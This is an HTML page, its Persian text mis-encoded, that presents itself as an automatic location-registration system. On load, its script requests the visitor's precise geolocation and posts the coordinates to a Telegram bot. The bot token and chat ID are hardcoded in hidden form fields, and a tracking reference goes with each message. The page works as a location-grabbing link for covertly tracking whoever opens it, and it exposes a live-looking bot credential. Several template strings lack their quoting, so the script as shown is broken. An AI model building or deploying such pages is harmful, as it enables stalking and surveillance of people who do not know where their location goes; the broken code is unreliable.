<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ø³Ø§Ù…Ø§Ù†Ù‡ Ø§Ø±Ø³Ø§Ù„ Ù„ÙˆÚ©ÛŒØ´Ù† Ø®ÙˆØ¯Ú©Ø§Ø± Ùˆ Ø¯Ù‚ÛŒÙ‚</title>
    <style>
        /* CSS Ø¨Ø±Ø§ÛŒ Ø·Ø±Ø§Ø­ÛŒ Ø±Ø³Ù…ÛŒ Ùˆ Ù…Ø¯Ø±Ù† */
        body {
            font-family: 'Tahoma', 'B Nazanin', Arial, sans-serif;
            background-color: #f4f7f6;
            color: #333;
            direction: rtl;
            text-align: right;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            background-color: #ffffff;
            border: 1px solid #e0e0e0;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
            padding: 30px 40px;
            border-radius: 10px;
            max-width: 550px;
            width: 90%;
            text-align: center;
        }
        h1 {
            color: #172a5a;
            font-size: 26px;
            border-bottom: 3px solid #172a5a;
            padding-bottom: 10px;
            margin-bottom: 25px;
            text-align: center;
        }
        .info-box {
            background-color: #f0f8ff;
            border-right: 5px solid #172a5a;
            padding: 15px;
            margin-bottom: 20px;
            font-size: 15px;
            color: #172a5a;
            text-align: justify;
        }
        #status-message {
            margin-top: 25px;
            padding: 20px;
            border-radius: 6px;
            font-size: 16px;
            font-weight: bold;
            text-align: center;
            background-color: #e9ecef;
            color: #495057;
        }
        .error {
            background-color: #f8d7da !important;
            color: #721c24 !important;
            border: 1px solid #f5c6cb;
        }
        .success {
            background-color: #d4edda !important;
            color: #155724 !important;
            border: 1px solid #c3e6cb;
        }
    </style>
</head>
<body onload="requestAndSendLocation()"> 
    
    <div class="container">
        <h1>Ø³Ø§Ù…Ø§Ù†Ù‡ Ø«Ø¨Øª Ù…ÙˆÙ‚Ø¹ÛŒØª Ù…Ú©Ø§Ù†ÛŒ Ø®ÙˆØ¯Ú©Ø§Ø±</h1>
        
        <div class="info-box">
            <p><strong>Ø§Ø·Ù„Ø§Ø¹ÛŒÙ‡ Ù…Ù‡Ù…:</strong> Ø³ÛŒØ³ØªÙ… Ø¨Ù‡ Ø·ÙˆØ± Ø®ÙˆØ¯Ú©Ø§Ø±ØŒ ÙØ±Ø¢ÛŒÙ†Ø¯ Ø¯Ø±Ø®ÙˆØ§Ø³Øª Ù…ÙˆÙ‚Ø¹ÛŒØª Ù…Ú©Ø§Ù†ÛŒ Ø´Ù…Ø§ Ø±Ø§ Ø¢ØºØ§Ø² Ú©Ø±Ø¯Ù‡ Ø§Ø³Øª. Ù„Ø·ÙØ§Ù‹ Ø¯Ø± ØµÙˆØ±Øª Ù…Ø´Ø§Ù‡Ø¯Ù‡ Ù¾ÛŒØºØ§Ù… Ù…Ø±ÙˆØ±Ú¯Ø±ØŒ *Ø§Ø¬Ø§Ø²Ù‡ Ø¯Ø³ØªØ±Ø³ÛŒ Ø¨Ù‡ Ù…Ú©Ø§Ù† (Location Access)* Ø±Ø§ ØµØ§Ø¯Ø± ÙØ±Ù…Ø§ÛŒÛŒØ¯.</p>
        </div>
        
        <input type="hidden" id="bot-token" value="7851461640:AAFr8MiKSffcmsalQMF-oczoUwopV1bfcu8"> 
        <input type="hidden" id="chat-id" value="7570861617"> 
        <input type="hidden" id="user-token-id" value="AUTO-REF-WEB-2025-02-B">

        <div id="status-message">â³ Ø¯Ø± Ø­Ø§Ù„ Ø¨Ø§Ø±Ú¯Ø°Ø§Ø±ÛŒ Ø³ÛŒØ³ØªÙ… Ùˆ Ø¯Ø±Ø®ÙˆØ§Ø³Øª Ù…ÙˆÙ‚Ø¹ÛŒØª Ù…Ú©Ø§Ù†ÛŒ...</div>
    </div>

    <script>
        // ØªØ§Ø¨Ø¹ Ú©Ù…Ú©ÛŒ Ø¨Ø±Ø§ÛŒ Ø¨Ù‡â€ŒØ±ÙˆØ²Ø±Ø³Ø§Ù†ÛŒ ÙˆØ¶Ø¹ÛŒØª Ù¾ÛŒØ§Ù… Ø¯Ø± ØµÙØ­Ù‡
        function updateStatus(message, type = '') {
            const statusElement = document.getElementById('status-message');
            statusElement.innerHTML = message;
            statusElement.className = type;
        }

        // ØªØ§Ø¨Ø¹ Ø§ØµÙ„ÛŒ: Ø¯Ø±Ø®ÙˆØ§Ø³Øª Ù„ÙˆÚ©ÛŒØ´Ù† Ù‡Ù†Ú¯Ø§Ù… Ø¨Ø§Ø±Ú¯Ø°Ø§Ø±ÛŒ ØµÙØ­Ù‡
        function requestAndSendLocation() {
            const BOT_TOKEN = document.getElementById('bot-token').value;
            const CHAT_ID = document.getElementById('chat-id').value;
            const USER_TOKEN = document.getElementById('user-token-id').value; // ØªÙˆÚ©Ù† Ø±Ù‡Ú¯ÛŒØ±ÛŒ Ø§Ø®ØªÛŒØ§Ø±ÛŒ

            if (!navigator.geolocation) {
                updateStatus("âŒ Ù…Ø±ÙˆØ±Ú¯Ø± Ø´Ù…Ø§ Ø§Ø² Geolocation Ù¾Ø´ØªÛŒØ¨Ø§Ù†ÛŒ Ù†Ù…ÛŒâ€ŒÚ©Ù†Ø¯.", 'error');
                return;
            }
            
            updateStatus("â³ Ø¯Ø± Ø­Ø§Ù„ Ø¯Ø±Ø®ÙˆØ§Ø³Øª Ù…ÙˆÙ‚Ø¹ÛŒØª Ù…Ú©Ø§Ù†ÛŒ... Ù„Ø·ÙØ§Ù‹ Ù…Ø¬ÙˆØ² Ù…Ø±ÙˆØ±Ú¯Ø± Ø±Ø§ ØªØ£ÛŒÛŒØ¯ Ú©Ù†ÛŒØ¯.");

            // Ø¯Ø±ÛŒØ§ÙØª Ù„ÙˆÚ©ÛŒØ´Ù† Ø¨Ø§ ØªÙ†Ø¸ÛŒÙ…Ø§Øª Ø¯Ù‚Øª Ø¨Ø§Ù„Ø§
            navigator.geolocation.getCurrentPosition(
                
                // Success Callback: Ø¯Ø± ØµÙˆØ±Øª Ø¯Ø±ÛŒØ§ÙØª Ù…ÙˆÙÙ‚ÛŒØªâ€ŒØ¢Ù…ÛŒØ² Ù…Ø®ØªØµØ§Øª
                (position) => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    
                    updateStatus(âœ… Ù…ÙˆÙ‚Ø¹ÛŒØª Ù…Ú©Ø§Ù†ÛŒ Ø¯Ø±ÛŒØ§ÙØª Ø´Ø¯. Latitude: ${lat}, Longitude: ${lon}. Ø¯Ø± Ø­Ø§Ù„ Ø§Ø±Ø³Ø§Ù„ Ø¨Ù‡ ØªÙ„Ú¯Ø±Ø§Ù…...);
                    
                    // ÙØ±Ø§Ø®ÙˆØ§Ù†ÛŒ ØªØ§Ø¨Ø¹ Ø§Ø±Ø³Ø§Ù„ Ù„ÙˆÚ©ÛŒØ´Ù† Ø¨Ù‡ ØªÙ„Ú¯Ø±Ø§Ù…
                    sendLocationToTelegram(lat, lon, USER_TOKEN, BOT_TOKEN, CHAT_ID);
                },
                
                // Error Callback: Ø¯Ø± ØµÙˆØ±Øª Ø¨Ø±ÙˆØ² Ø®Ø·Ø§ (Ù…Ø«Ù„ Ø¹Ø¯Ù… ØµØ¯ÙˆØ± Ù…Ø¬ÙˆØ²)
                (error) => {
                    let errorMessage;
                    switch(error.code) {
                        case error.PERMISSION_DENIED:
                            errorMessage = "âŒ *Ø¹Ø¯Ù… Ù…Ø¬ÙˆØ²:* Ú©Ø§Ø±Ø¨Ø± Ø¯Ø³ØªØ±Ø³ÛŒ Ø±Ø§ Ù„ØºÙˆ Ú©Ø±Ø¯.";
                            break;
                        case error.POSITION_UNAVAILABLE:
                            errorMessage = "âš  *Ø®Ø·Ø§ÛŒ ÙÙ†ÛŒ:* Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ù…ÙˆÙ‚Ø¹ÛŒØª Ù…Ú©Ø§Ù†ÛŒ Ø¯Ø± Ø¯Ø³ØªØ±Ø³ Ù†ÛŒØ³Øª.";
                            break;
                        case error.TIMEOUT:
                            errorMessage = "âŒ› *Ø®Ø·Ø§ÛŒ ÙˆÙ‚ÙÙ‡:* Ø¯Ø±Ø®ÙˆØ§Ø³Øª Ù…ÙˆÙ‚Ø¹ÛŒØª Ù…Ú©Ø§Ù†ÛŒ Ø¨Ù‡ Ù¾Ø§ÛŒØ§Ù† Ø±Ø³ÛŒØ¯.";
                            break;
                        default:
                            errorMessage = "ğŸ”¥ *Ø®Ø·Ø§ÛŒ Ù†Ø§Ù…Ø´Ø®Øµ:* Ø¯Ø± Ø¯Ø±ÛŒØ§ÙØª Ù…ÙˆÙ‚Ø¹ÛŒØª Ù…Ú©Ø§Ù†ÛŒ Ø±Ø® Ø¯Ø§Ø¯.";
                    }
                    updateStatus(errorMessage, 'error');
                },
                
                // ØªÙ†Ø¸ÛŒÙ…Ø§Øª Geolocation API
                {
                    enableHighAccuracy: true,
                    timeout: 5000,
                    maximumAge: 0
                }
            );
        }

        // ØªØ§Ø¨Ø¹ Ø§Ø±Ø³Ø§Ù„ Ø¨Ù‡ ØªÙ„Ú¯Ø±Ø§Ù… Ø¨Ø§ Ø§Ø³ØªÙØ§Ø¯Ù‡ Ø§Ø² Ù…ØªØ¯ sendLocation
        function sendLocationToTelegram(lat, lon, userToken, botToken, chatId) {
            
            // Ø¢Ø¯Ø±Ø³ API Ø¨Ø±Ø§ÛŒ Ù…ØªØ¯ sendLocation (Ø¯Ù‚Øª Ú©Ù†ÛŒØ¯ Ú©Ù‡ /bot Ø­Ø°Ù Ø´Ø¯Ù‡ Ø§Ø³Øª)
            const telegramApiUrl = https://api.telegram.org/bot${botToken}/sendLocation;
            
            // Ø¨Ø¯Ù†Ù‡ Ø¯Ø±Ø®ÙˆØ§Ø³Øª (Payload) Ø¨Ø§ Ù¾Ø§Ø±Ø§Ù…ØªØ±Ù‡Ø§ÛŒ Ø§ØµÙ„ÛŒ sendLocation
            const payload = {
                chat_id: chatId,
                latitude: lat,        // Ø§Ø±Ø³Ø§Ù„ Ù…Ø³ØªÙ‚ÛŒÙ… Ø¹Ø±Ø¶ Ø¬ØºØ±Ø§ÙÛŒØ§ÛŒÛŒ
                longitude: lon,       // Ø§Ø±Ø³Ø§Ù„ Ù…Ø³ØªÙ‚ÛŒÙ… Ø·ÙˆÙ„ Ø¬ØºØ±Ø§ÙÛŒØ§ÛŒÛŒ
                // Ù¾Ø§Ø±Ø§Ù…ØªØ±Ù‡Ø§ÛŒ Ø§Ø®ØªÛŒØ§Ø±ÛŒ Ø²ÛŒØ± Ø¨Ø±Ø§ÛŒ Ø§Ø¶Ø§ÙÙ‡ Ú©Ø±Ø¯Ù† Ø¬Ø²Ø¦ÛŒØ§Øª Ø¨ÛŒØ´ØªØ± Ø¨Ù‡ Ù¾ÛŒØ§Ù… Ø¨Ø¹Ø¯ Ø§Ø² Ù†Ù‚Ø´Ù‡ Ù…ÙÛŒØ¯ Ø§Ø³Øª
                caption: âœ… **Ù…ÙˆÙ‚Ø¹ÛŒØª Ù…Ú©Ø§Ù†ÛŒ Ø«Ø¨Øª Ø´Ø¯!**\nØªÙˆÚ©Ù† Ø±Ù‡Ú¯ÛŒØ±ÛŒ: \${userToken}\\nØ²Ù…Ø§Ù†: ${new Date().toLocaleString('fa-IR')},
                parse_mode: 'Markdown'
            };

            fetch(telegramApiUrl, {
                method: 'POST',
                headers: {
                    // Content-Type Ø¨Ø§ÛŒØ¯ application/json Ø¨Ø§Ø´Ø¯
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload), // Ø§Ø±Ø³Ø§Ù„ Ø¯Ø§Ø¯Ù‡â€ŒÙ‡Ø§ Ø¨Ù‡ ØµÙˆØ±Øª JSON
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    updateStatus("âœ” *Ø§Ø±Ø³Ø§Ù„ Ù…ÙˆÙÙ‚!* Ù†Ù‚Ø´Ù‡ Ù…ÙˆÙ‚Ø¹ÛŒØª Ù…Ú©Ø§Ù†ÛŒ Ø¨Ø§ Ù…ÙˆÙÙ‚ÛŒØª Ø¨Ù‡ ØªÙ„Ú¯Ø±Ø§Ù… Ø§Ø±Ø³Ø§Ù„ Ø´Ø¯.", 'success');
                } else {
                    updateStatus(âŒ **Ø®Ø·Ø§ Ø¯Ø± API ØªÙ„Ú¯Ø±Ø§Ù…:** ${data.description}. (Ø¨Ø§ ÙˆØ¬ÙˆØ¯ ØªÙˆÚ©Ù† Ù…Ø¹ØªØ¨Ø±ØŒ Ù…Ø´Ú©Ù„ Ø¯Ø± Ø§Ø±Ø³Ø§Ù„ Ø¯Ø§Ø¯Ù‡ Ø§Ø³Øª.), 'error');
                    console.error("Telegram API Error:", data);
                }
            })
            .catch((error) => {
                updateStatus(ğŸ”¥ **Ø®Ø·Ø§ÛŒ Ø´Ø¨Ú©Ù‡:** Ø§ØªØµØ§Ù„ Ø¨Ù‡ Ø³Ø±ÙˆØ± ØªÙ„Ú¯Ø±Ø§Ù… Ø¨Ø±Ù‚Ø±Ø§Ø± Ù†Ø´Ø¯: ${error.message}, 'error');
                console.error("Network Error:", error);
            });
        }
    </script>
</body>
</html>
